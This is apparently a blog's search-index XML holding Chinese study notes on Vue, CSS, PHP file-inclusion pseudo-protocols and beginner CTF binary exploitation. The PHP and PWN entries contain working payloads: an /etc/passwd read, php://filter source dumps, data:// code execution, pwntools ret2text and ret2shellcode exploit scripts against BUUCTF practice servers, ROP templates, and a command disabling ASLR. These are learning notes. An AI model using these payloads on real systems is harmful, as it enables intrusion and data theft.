<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>前端开发--VUE</title>
    <link href="/%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91-VUE/"/>
    <url>/%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91-VUE/</url>
    
    <content type="html"><![CDATA[<h1 id="vue-安装"><a href="#vue-安装" class="headerlink" title="vue 安装"></a>vue 安装</h1><ol><li><p>使用 webpack</p><div class="code-wrapper"><pre><code class="hljs bash">npm install -g @vue/clivue create vue-projectnpm run serve</code></pre></div></li><li><p>使用 vite</p><div class="code-wrapper"><pre><code class="hljs bash">npm create vue@leatestnpm inpm run dev</code></pre></div></li></ol><h1 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h1><p>创建vue实例</p><div class="code-wrapper"><pre><code class="hljs vue">import &#123;createApp&#125; from &quot;vue&quot;import App from &quot;./App.vue&quot;createApp(App).mount(&quot;#app&quot;)&lt;template&gt;    &lt;div class=&quot;main&quot;&gt;        &lt;p&gt;&#123;&#123; msg &#125;&#125;&lt;/p&gt;    &lt;/div&gt;&lt;/template&gt;&lt;script lang=&quot;ts&quot;&gt;export default &#123;    data()&#123;        return &#123;            msg: &quot;Hello world&quot;        &#125;    &#125;&#125;&lt;/script&gt;&lt;style&gt;.main&#123;    background-color: #ddd;&#125;&lt;/style&gt;</code></pre></div><h2 id="模板语法"><a href="#模板语法" class="headerlink" title="模板语法"></a>模板语法</h2><ol><li><p>插值</p><blockquote><p>vue 使用 <code>&#123;&#123; &#125;&#125;</code> 来表示文本插值</p></blockquote></li></ol><div class="code-wrapper"><pre><code class="hljs vue">&lt;p&gt;&#123;&#123; message &#125;&#125;&lt;/p&gt;</code></pre></div><ol><li><p>指令</p><blockquote><p>指令是带有 <code>v-</code> 前缀，用于在模板种表达逻辑</p></blockquote></li></ol><p>v-html 解析html代码</p><div class="code-wrapper"><pre><code class="hljs vue">&lt;p v-html=&quot;text&quot;&gt;&lt;/p&gt;</code></pre></div><p>v-bind 动态绑定一个或多个属性</p><div class="code-wrapper"><pre><code class="hljs vue">&lt;a v-bind:href=&quot;url&quot;&gt;点击&lt;/a&gt;</code></pre></div><p>简写：</p><div class="code-wrapper"><pre><code class="hljs vue">&lt;a :href=&quot;url&quot;&gt;点击&lt;/a&gt;</code></pre></div><h2 id="条件渲染"><a href="#条件渲染" class="headerlink" title="条件渲染"></a>条件渲染</h2><div class="code-wrapper"><pre><code class="hljs vue">v-ifv-else-ifv-elsev-show</code></pre></div><ul><li>v-if 与 v-show 的区别</li></ul><blockquote><p>v-if 是真正的条件渲染，因为他会确保在切换过程中条件快内的事件监听器和子组件适当地被销毁和重建</p><p>v-if 也是惰性的：如果在初始渲染条件为假，则什么也不做–直到条件第一次变为真时，才会开始渲染条件块</p><p>相比之下，v-show 就简单很多–不管初始条件是什么，元素块总是会被渲染，并且只是简单地基于css进行切换。</p><p>一般来说，v-if 有更高的切换开销，而 v-show 有更高的初始渲染开销，因此，如果又需要非常频繁地切换，则使用 v-show 较好；如果在运行时条件很少改变，则使用 v-if 较好。</p></blockquote><p>使用template标签</p><div class="code-wrapper"><pre><code class="hljs vue">&lt;template&gt;    &lt;div class=&quot;main&quot;&gt;        &lt;p v-if=&quot;flag&quot;&gt;test&lt;/p&gt;        &lt;template v-if=&quot;flag&quot;&gt;            &lt;p&gt;1&lt;/p&gt;            &lt;p&gt;2&lt;/p&gt;            &lt;p&gt;3&lt;/p&gt;&lt;/template&gt;    &lt;/div&gt;&lt;/template&gt;&lt;script lang=&quot;ts&quot;&gt;export default &#123;    data()&#123;        return &#123;            msg: &quot;Hello world&quot;        &#125;    &#125;&#125;&lt;/script&gt;&lt;style&gt;.main&#123;    background-color: #ddd;&#125;&lt;/style&gt;</code></pre></div><h2 id="列表渲染"><a href="#列表渲染" class="headerlink" title="列表渲染"></a>列表渲染</h2><p>使用 <code>v-for</code></p><div class="code-wrapper"><pre><code class="hljs vue">&lt;template&gt;&lt;ul v-for=&quot;item in items&quot; :key=&quot;item.id&quot;&gt;    &lt;li&gt;&#123;&#123; item.name &#125;&#125;&lt;/li&gt;&lt;/ul&gt;&lt;/template&gt;&lt;script&gt;export default&#123;    data()&#123;        return&#123;            items:[                &#123;                    id:1001,                    name: &quot;Lixiney&quot;                &#125;,                &#123;                    id:1002,                    name: &quot;nomo&quot;                &#125;,                &#123;                    id:1001,                    name: &quot;yout&quot;                &#125;            ]        &#125;    &#125;&#125;&lt;/script&gt;</code></pre></div><p>如果 <code>items</code> 数据中没有索引，可以使用 <code>index</code></p><div class="code-wrapper"><pre><code class="hljs vue">v-for=&quot;(item,index) in items&quot; :key=&quot;item.index&quot;</code></pre></div><h2 id="事件处理"><a href="#事件处理" class="headerlink" title="事件处理"></a>事件处理</h2><blockquote><div class="code-wrapper"><pre><code class="hljs autohotkey">v-on` 可以简写为 `@</code></pre></div></blockquote><p>eg：</p><div class="code-wrapper"><pre><code class="hljs vue">&lt;template&gt;&lt;button v-on:click=&quot;clickHandle&quot;&gt;按钮&lt;/button&gt;&lt;!-- &lt;button @click=&quot;clickHandle&quot;&gt;按钮&lt;/button&gt; --&gt;&lt;p v-show=&quot;flag&quot;&gt;Hello&lt;/p&gt;&lt;/template&gt;&lt;script&gt;export default&#123;    data()&#123;        return&#123;            flag: true        &#125;    &#125;,    methods:&#123;        clickHandle()&#123;            this.flag = !this.flag        &#125;    &#125;&#125;&lt;/script&gt;</code></pre></div><h3 id="事件传参"><a href="#事件传参" class="headerlink" title="事件传参"></a>事件传参</h3><div class="code-wrapper"><pre><code class="hljs vue">&lt;template&gt;&lt;ul v-for=&quot;item in items&quot; :key=&quot;item.id&quot;&gt;    &lt;li @click=&quot;clickMessageHandle(item.name,$event)&quot;&gt;&#123;&#123; item.name &#125;&#125;&lt;/li&gt;&lt;/ul&gt;&lt;button v-on:click=&quot;func&quot;&gt;按钮&lt;/button&gt;&lt;!-- &lt;p v-show=&quot;flag&quot;&gt;Hello&lt;/p&gt; --&gt;&lt;/template&gt;&lt;script&gt;export default&#123;    data()&#123;        return&#123;            items:[                &#123;                    id:1001,                    name: &quot;Lixiney&quot;                &#125;,                &#123;                    id:1002,                    name: &quot;nomo&quot;                &#125;,                &#123;                    id:1001,                    name: &quot;yout&quot;                &#125;            ],            flag: true        &#125;    &#125;,    methods:&#123;        func()&#123;            this.flag = !this.flag        &#125;,        clickMessageHandle(data,e)&#123;            console.log(data,e)   // 如果没有传参则event可以使用        &#125;    &#125;&#125;&lt;/script&gt;</code></pre></div><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h2 id="事件修饰符"><a href="#事件修饰符" class="headerlink" title="事件修饰符"></a>事件修饰符</h2>]]></content>
    
    
    <categories>
      
      <category>开发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vue</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>前端开发--CSS层叠样式表</title>
    <link href="/%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91-CSS%E5%B1%82%E5%8F%A0%E6%A0%B7%E5%BC%8F%E8%A1%A8/"/>
    <url>/%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91-CSS%E5%B1%82%E5%8F%A0%E6%A0%B7%E5%BC%8F%E8%A1%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="字体属性"><a href="#字体属性" class="headerlink" title="字体属性"></a>字体属性</h1><blockquote><p>CSS 字体属性定义字体，加粗，大小，文字样式</p></blockquote><ul><li>color 规定文本的颜色</li><li>font-size 设置文本的大小 # chrome浏览器接受的最小字体是12px</li><li>font-weight 设置文本的粗细</li></ul><table><thead><tr><th>值</th><th>描述</th></tr></thead><tbody><tr><td>blod</td><td>定义粗体字体</td></tr><tr><td>bolder</td><td>定义更粗的字体</td></tr><tr><td>lighter</td><td>定义更细的字体</td></tr><tr><td>100-900</td><td>由细到粗，400等同默认， 700等同bold</td></tr></tbody></table><ul><li>font-style 指定文本的字体样式</li></ul><table><thead><tr><th>值</th><th>描述</th></tr></thead><tbody><tr><td>normal</td><td>默认值</td></tr><tr><td>italic</td><td>定义斜体字</td></tr></tbody></table><ul><li>font-family 指定一个元素的字体</li></ul><blockquote><p>每个值用都好分开</p><p>如果字体名称包含空格，必须加上引号</p></blockquote><h1 id="背景属性"><a href="#背景属性" class="headerlink" title="背景属性"></a>背景属性</h1><table><thead><tr><th>属性</th><th>描述</th></tr></thead><tbody><tr><td>background-color</td><td>设置背景颜色</td></tr><tr><td>background-image</td><td>设置背景图片</td></tr><tr><td>background-attachment</td><td>设置背景图片是否随着内容滚动还是固定</td></tr><tr><td>background-position</td><td>设置背景图片显示位置</td></tr><tr><td>background-repeat</td><td>设置背景图片如何填充</td></tr><tr><td>background</td><td>复合属性</td></tr></tbody></table><ul><li>background-image 属性</li></ul><blockquote><p>元素的背景是元素的总大小，包括填充和边界（不包括外边距）。</p><p>默认情况下 background-image 属性放置在元素的左上角，如果图像不够大的话会在垂直和水平方向平铺图像，如果图像大小超过元素大小从图像的左上角显示元素大小的部分</p></blockquote><ul><li>background-repeat 属性</li></ul><table><thead><tr><th>值</th><th>说明</th></tr></thead><tbody><tr><td>repeat</td><td>默认值</td></tr><tr><td>repeat-x</td><td>只向水平方向平铺</td></tr><tr><td>repeat-y</td><td>只向垂直方向平铺</td></tr><tr><td>no-repeat</td><td>不平铺</td></tr></tbody></table><ul><li>background-size 属性</li></ul><blockquote><p>设置背景图像的大小</p></blockquote><table><thead><tr><th>值</th><th>说明</th></tr></thead><tbody><tr><td>length</td><td>设置背景图片的宽度和高度，第一个值宽度，第二个值高度，如果只是设置一个，第二个值auto</td></tr><tr><td>percentage</td><td>计算相对位置区域的百分比，第一个值宽度，第二个值高度，如果只是设置一个，第二个值auto</td></tr><tr><td>cover</td><td>保持图片纵横比并将图片缩放成完全覆盖背景区域的最小大小</td></tr><tr><td>contain</td><td>保持图片纵横比并将图像缩放成适合背景定位区域的最大大小</td></tr></tbody></table><ul><li>background-position 属性</li></ul><blockquote><p>该属性设置背景图像的其实位置，其默认值是 0% 0%</p></blockquote><p>上下左右中， top bottom left right center</p><p>x y 单位可以是% 也可以是 px</p><ul><li>background-attachment 属性</li></ul><blockquote><p>该属性设置背景图像是否固定或者随页面滚动。简单来说就是一个页面有滚动条的话，滑动滚动条背景是固定的还是随着页面滚动</p></blockquote><table><thead><tr><th>值</th><th>说明</th></tr></thead><tbody><tr><td>scroll</td><td>背景图片随着页面滚动而滚动</td></tr><tr><td>fixed</td><td>背景图片固定</td></tr></tbody></table><h1 id="文本属性"><a href="#文本属性" class="headerlink" title="文本属性"></a>文本属性</h1><ul><li>text-align</li></ul><blockquote><p>指定元素文本的水平对齐方式</p></blockquote><table><thead><tr><th>值</th><th>描述</th></tr></thead><tbody><tr><td>left</td><td>文本居左排列，默认值</td></tr><tr><td>right</td><td>右对齐</td></tr><tr><td>center</td><td>居中对齐</td></tr></tbody></table><ul><li>text-decoration</li></ul><blockquote><p>规定添加到文本的修饰，下划线、上划线、删除线等</p></blockquote><table><thead><tr><th>值</th><th>描述</th></tr></thead><tbody><tr><td>underline</td><td>下划线</td></tr><tr><td>overline</td><td>上划线</td></tr><tr><td>line-through</td><td>删除线</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>开发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>前端</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP文件包含-伪协议</title>
    <link href="/PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    <url>/PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<table><thead><tr><th>伪协议</th><th>含义</th></tr></thead><tbody><tr><td>file:&#x2F;&#x2F;</td><td>访问本地文件系统</td></tr><tr><td>php:&#x2F;&#x2F;</td><td>访问各个输入&#x2F;输出流（I&#x2F;O streams）</td></tr><tr><td>zlib:&#x2F;&#x2F;</td><td>压缩流</td></tr><tr><td>data:&#x2F;&#x2F;</td><td>数据流</td></tr><tr><td>glob:&#x2F;&#x2F;</td><td>查找匹配的文件路径模式</td></tr><tr><td>phar:&#x2F;&#x2F;</td><td>php 归档</td></tr><tr><td>ssh2:&#x2F;&#x2F;</td><td>Secure Shell 2</td></tr><tr><td>rar:&#x2F;&#x2F;</td><td>RAR</td></tr><tr><td>ogg:&#x2F;&#x2F;</td><td>音频流</td></tr></tbody></table><h1 id="php-ini-参数"><a href="#php-ini-参数" class="headerlink" title="php.ini 参数"></a>php.ini 参数</h1><ul><li>allow_url_fopen    默认为 On 允许url里封装协议访问文件</li><li>allow_url_include    默认为 Off   不允许包含url 里的封装协议包含文件</li></ul><h1 id="各种伪协议的利用方法"><a href="#各种伪协议的利用方法" class="headerlink" title="各种伪协议的利用方法"></a>各种伪协议的利用方法</h1><ul><li>file:&#x2F;&#x2F; 协议</li></ul><div class="code-wrapper"><pre><code class="hljs awk">file:<span class="hljs-regexp">//</span><span class="hljs-regexp">/etc/</span>passwd</code></pre></div><ul><li>php:&#x2F;&#x2F;filter</li></ul><div class="code-wrapper"><pre><code class="hljs livecodeserver">php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">read</span>=<span class="hljs-built_in">convert</span>.base64-encode/resource=index.php</code></pre></div><ul><li>php:&#x2F;&#x2F;data   【allow_url_include 设置为 On】</li></ul><p><img src="/./PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-%E4%BC%AA%E5%8D%8F%E8%AE%AE/image-20251113224557980.png" alt="image-20251113224557980"></p><ul><li>zip:&#x2F;&#x2F; 协议</li></ul><div class="code-wrapper"><pre><code class="hljs dts"><span class="hljs-symbol">zip:</span><span class="hljs-comment">//test.zip%23phpinfo.txt</span></code></pre></div><p><img src="/./PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-%E4%BC%AA%E5%8D%8F%E8%AE%AE/image-20251113225021349.png" alt="image-20251113225021349"></p><p><img src="/./PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-%E4%BC%AA%E5%8D%8F%E8%AE%AE/image-20251113225132654.png" alt="image-20251113225132654"></p><ul><li>data:&#x2F;&#x2F;   【allow_url_iclude 设置为 On】</li></ul><div class="code-wrapper"><pre><code class="hljs php-template"><span class="language-xml">data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span></code></pre></div><div class="code-wrapper"><pre><code class="hljs php">data:text/plain,<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs awk">data:<span class="hljs-regexp">//</span>text<span class="hljs-regexp">/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/</span>Pg==</code></pre></div><h2 id="php-filter-其他过滤器"><a href="#php-filter-其他过滤器" class="headerlink" title="php:&#x2F;&#x2F;filter  其他过滤器"></a>php:&#x2F;&#x2F;filter  其他过滤器</h2><table><thead><tr><th>过滤器</th><th>作用</th></tr></thead><tbody><tr><td>string.rot13</td><td>rot13编码</td></tr><tr><td>string.toupper</td><td>转大写字母</td></tr><tr><td>string.tolower</td><td>转小写字母</td></tr><tr><td>string.strip_tags</td><td>去除html标签</td></tr></tbody></table><p>例子 ： </p><p><code>php://filter/read=string.rot13/resource=index.php</code></p>]]></content>
    
    
    
    <tags>
      
      <tag>web安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PWN 入门基础笔记</title>
    <link href="/PWN-%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/"/>
    <url>/PWN-%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><ul><li>Python3</li><li>pip</li><li>gdb-pwndbg 插件</li><li>pwntools</li><li>IDA</li><li>checksec</li></ul><h2 id="checksec-安装以及基本环境"><a href="#checksec-安装以及基本环境" class="headerlink" title="checksec 安装以及基本环境"></a>checksec 安装以及基本环境</h2><blockquote><p>使用 apt 安装的最新版的用不习惯，如果安装了pwntools，里面会自带checksec工具</p></blockquote><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt install checksec</code></pre></div><h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><p><img src="/./PWN-%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/image-20251005163822224.png" alt="image-20251005163822224"></p><ul><li>Arch</li></ul><p>程序架构信息，判断该程序是32位还是64位程序，编写exp时选择 p32() 还是 p64()</p><ul><li>RELRO</li></ul><p>Relocation Read-Only (RELRO) 此项技术主要针对 GOT 改写的攻击方式。它分为两种，Partial RELRO 和 Full RELRO。</p><ul><li>Stack</li></ul><p>栈溢出保护，如果看到这个选项没有开启则可以尝试栈溢出攻击</p><ul><li>NX</li></ul><p>NX enabled如果这个保护开启就是意味着栈中数据没有执行权限，如此一来, 当攻击者在堆栈上部署自己的 shellcode 并触发时, 只会直接造成程序的崩溃，但是可以利用rop这种方法绕过</p><ul><li>PIE</li></ul><p>无关而执行文件，该技术是针对代码段落（.text），数据段（.data），未初始化全局变量段（bss）等固定地址的一个防护技术，如果程序开启了PIE保护的话，在每次加载程序时都变换加载地址，不能通过ROPgadget等工具来解题</p><h2 id="pwntools-安装以及基本用法"><a href="#pwntools-安装以及基本用法" class="headerlink" title="pwntools 安装以及基本用法"></a>pwntools 安装以及基本用法</h2><ul><li>使用 pip 安装 (win)</li></ul><div class="code-wrapper"><pre><code class="hljs bash">pip install pwntools</code></pre></div><ul><li>使用 apt 安装 (Linux)</li></ul><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt install python3-pwntools</code></pre></div><h3 id="用法-1"><a href="#用法-1" class="headerlink" title="用法"></a>用法</h3><ol><li>导入模块</li></ol><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</code></pre></div><ol start="2"><li>打开链接</li></ol><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># 本地连接</span>io = process(<span class="hljs-string">&quot;文件&quot;</span>)<span class="hljs-comment"># 远程连接</span>io = remote(<span class="hljs-string">&quot;[ip]&quot;</span>,[端口])</code></pre></div><ol start="3"><li>从服务器接收数据</li></ol><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#接收一行数据</span>io.revcline()<span class="hljs-comment"># 全部接收</span>io.recv()<span class="hljs-comment"># 在读到 test 之前一直读入数据</span>io.recvuntil(<span class="hljs-string">&#x27;test&#x27;</span>)<span class="hljs-comment"># 读入 10 位数据</span>io.recv(<span class="hljs-number">10</span>)</code></pre></div><ol start="4"><li>向服务器发送数据</li></ol><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># 发送一行数据</span>io.sendline()<span class="hljs-comment"># 如果是32位程序则需要把数据打包成32比特宽度的字节流的形式</span>io.sendline(p32(<span class="hljs-string">&#x27;&#x27;</span>))<span class="hljs-comment"># 如果是64位程序</span>io.sendline(p64(<span class="hljs-string">&#x27;&#x27;</span>))</code></pre></div><ol start="5"><li>进入交互模式</li></ol><div class="code-wrapper"><pre><code class="hljs python">io.interactive()</code></pre></div><h1 id="栈溢出-（Stack-Overflow）"><a href="#栈溢出-（Stack-Overflow）" class="headerlink" title="栈溢出 （Stack Overflow）"></a>栈溢出 （Stack Overflow）</h1><blockquote><p>一种后进先出的数据结构</p></blockquote><p><img src="/./PWN-%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/image-20251008093049662.png" alt="image-20251008093049662"></p><p>栈是计算机内存中的一块特殊区域，用于存储<a href="https://so.csdn.net/so/search?q=%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8&spm=1001.2101.3001.7020">函数调用</a>时的局部变量、函数参数、返回地址等信息。栈遵循后进先出（LIFO）的原则，即最后进入栈的数据最先被取出。</p><p>栈是从高地址向低地址延伸的。每个函数的每次调用，都有它自己独立的一个栈帧，这个栈帧中维持着所需要的各种信息。寄存器ebp指向当前的栈帧的底部（高地址），寄存器esp指向当前的栈帧的顶部（低地址）</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>栈溢出指的是在程序向栈中写入数据时，程序没有限制输入数据的大小，写入的数据量超过了栈的剩余空间，导致数据溢出到相邻的内存区域，覆盖了原本不应被修改的数据，如函数的返回地址，所以攻击者可以构造恶意代码来 getshell</p><h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><blockquote><p>Return To Text</p><p>这里用 buuctf PWN 方向第二题 rip </p></blockquote><h3 id="信息搜集阶段"><a href="#信息搜集阶段" class="headerlink" title="信息搜集阶段"></a>信息搜集阶段</h3><ol><li>拿到程序之后先检查一下程序的位数，看看用 ida64 还是 ida32</li></ol><p><img src="/./PWN-%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/image-20251008100208940.png"></p><ol start="2"><li>checksec 检查一下程序的保护状态，可以看到 Stack 栈溢出保护没有开，所以有很大可能是栈溢出</li></ol><p><img src="/./PWN-%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/image-20251008100722937.png" alt="image-20251008100722937"></p><h3 id="在-ida-中分析程序"><a href="#在-ida-中分析程序" class="headerlink" title="在 ida 中分析程序"></a>在 ida 中分析程序</h3><ol><li>使用 ida64 打开程序</li></ol><p><img src="/./PWN-%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/image-20251008101019692.png" alt="image-20251008101019692"></p><ol start="2"><li>在左侧的栏内找到 main 函数，双击之后按 Tab 键可以查看反编译后的伪代码</li></ol><p><img src="/./PWN-%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/image-20251008101221201.png" alt="image-20251008101221201"></p><ol start="3"><li>可以看到有一个 gets 函数，基本上确定是栈溢出攻击了。</li><li>双击变量 s 查看栈帧，可以推断出来需要填充的垃圾数据的长度  0xF + ebp [如果是 64 位程序就是 <code>8</code>，如果是32位程序就是 <code>4</code>]</li></ol><p><img src="/./PWN-%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/image-20251013182957343.png" alt="image-20251013182957343"></p><h3 id="确定垃圾字符的长度"><a href="#确定垃圾字符的长度" class="headerlink" title="确定垃圾字符的长度"></a>确定垃圾字符的长度</h3><blockquote><p>在上一步操作中已经推断出来了，但是还有另外几种方法，在此记录一下，具体以 gdb 调试的结果为准</p></blockquote><ol><li>使用 <code>堆栈指针</code> ， 在 <code>选项 - 常规 </code> 中 勾选 <code>堆栈指针</code></li></ol><p><img src="/./PWN-%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/image-20251013183541427.png" alt="image-20251013183541427"></p><p>可以确定长度 为 <code>0x18</code></p><ol start="2"><li><p>使用 pwngdb 调试</p><ol><li><code>gdb + 文件名</code> 进入gdb调试界面</li><li><code>starti</code> 执行 <code> disass main</code> 查看 main 函数的反汇编代码，<code>b *[16进制地址]</code> 在输入数据的地方打断点</li><li><code>run</code> 运行程序 <code>n</code> 输入输入 <code>AAAAAAA</code> ，在 0x7fffffffdd61 处输入 ，在 0x7fffffffdd78 之后跳出</li></ol><p> <img src="/./PWN-%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/image-20251013194932319.png" alt="image-20251013194932319"></p><p> <img src="/./PWN-%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/image-20251013195047001.png" alt="image-20251013195047001"></p><ol start="4"><li><code>p/d 地址1-地址2</code>  计算一下要填充垃圾字符的位数，得到 长度为 <code>23</code> 是个不是 8 的倍数，同时又是一个64位的程序，所以要考虑 <code>堆栈平衡</code> 的问题</li></ol></li><li><p>使用 msf 自带的命令生成垃圾字符</p><ol><li><code>msf-pattern_create -l 400</code> 生成一段长度为 400 的垃圾字符</li></ol><p> <img src="/./PWN-%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/image-20251013195802033.png" alt="image-20251013195802033"></p><ol start="2"><li>依旧是进入 <code>pwngdb</code> 调试，打完断点之后在输入数据的地方将这个长度为 400 的字符串传进去，寻找 <code>RBP</code></li></ol><p> <img src="/./PWN-%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/image-20251013200151394.png" alt="image-20251013200151394"></p><ol start="3"><li><code>RBP</code> 只能截取到 <code>a6Aa</code> 说明被撑爆了，只需要看看 <code>a6Aa</code> 这个字符串在刚刚生成的字符串的位置即可</li><li><code>msf-pattern_offset -q a6Aa</code> 算出来<code>19</code> 再加上 <code>a6Aa</code> 本身的长度<code>4</code> ，就是 <code>23</code></li></ol><p> <img src="/./PWN-%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/image-20251013200743468.png" alt="image-20251013200743468"></p></li></ol><h3 id="找到可以利用的shell函数地址"><a href="#找到可以利用的shell函数地址" class="headerlink" title="找到可以利用的shell函数地址"></a>找到可以利用的shell函数地址</h3><ol><li>在 IDA 中 按 <code>SHIFT + F12</code> 可以查看可打印字符</li></ol><p><img src="/./PWN-%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/image-20251013201019052.png" alt="image-20251013201019052"></p><ol start="2"><li>双击之后 按<code>CTRL + X</code> 交叉引用一下，拿到地址为<code>0x40118A</code></li></ol><p><img src="/./PWN-%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/image-20251013201509913.png" alt="image-20251013201509913"></p><h3 id="编写-EXP"><a href="#编写-EXP" class="headerlink" title="编写 EXP"></a>编写 EXP</h3><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *io = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">29582</span>)addr = <span class="hljs-number">0x40118A</span>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">23</span> + p64(addr+<span class="hljs-number">1</span>) <span class="hljs-comment"># 堆栈平衡，所以这里要 +1</span>io.sendline(payload)io.interactive()</code></pre></div><h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><blockquote><p>同样是栈溢出，但是程序中没有可以利用的后门函数，这个时候就需要生成shellcode</p></blockquote><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>攻击者需要将 shellcode （shell 的机器码）注入到内存当中，随后lion给栈溢出复写 return_address，使程序跳转至 shellcode 所在的内存地址</p><p>注意 ： 需要在 <code>ASLR</code>  保护机制没有开启的情况下才能利用成功</p><h3 id="ASLR-保护机制"><a href="#ASLR-保护机制" class="headerlink" title="ASLR 保护机制"></a>ASLR 保护机制</h3><blockquote><p>地址随机化</p></blockquote><p>开启之后，每次程序加载是 stack、libaries、heap的基址都会随机化。</p><p>三种状态</p><ol><li>随机化关闭</li></ol><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</code></pre></div><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><blockquote><p>生成shellcode</p></blockquote><div class="code-wrapper"><pre><code class="hljs python">shell_code = asm(shellcraft.sh())</code></pre></div><ul><li>完整exp 案例</li></ul><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *io = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">27627</span>)buf_addr = <span class="hljs-number">0x233000</span>offset = <span class="hljs-number">56</span>shell_code = asm(shellcraft.sh())payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">56</span> + p64(buf_addr)io.sendline(shell_code)io.recvline()io.sendline(payload)io.interactive()<span class="hljs-built_in">print</span>(payload)</code></pre></div><h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><h3 id="32位-ROP-链-构造"><a href="#32位-ROP-链-构造" class="headerlink" title="32位 ROP 链 构造"></a>32位 ROP 链 构造</h3><blockquote><p>payload 格式</p></blockquote><div class="code-wrapper"><pre><code class="hljs python">payload = <span class="hljs-string">b&#x27;a&#x27;</span> * [垃圾数据长度] + p32(_system 地址) + p32(<span class="hljs-number">0</span>) + p32(/<span class="hljs-built_in">bin</span>/sh 地址)</code></pre></div><h3 id="64位-ROP-链-构造"><a href="#64位-ROP-链-构造" class="headerlink" title="64位 ROP 链 构造"></a>64位 ROP 链 构造</h3><blockquote><p>payload 格式</p></blockquote><div class="code-wrapper"><pre><code class="hljs python">payload = <span class="hljs-string">b&#x27;a&#x27;</span> * [垃圾数据长度] + p64(rdi) + p64(/<span class="hljs-built_in">bin</span>/sh 地址) + p64(_system 地址)</code></pre></div>]]></content>
    
    
    
    <tags>
      
      <tag>PWN</tag>
      
    </tags>
    
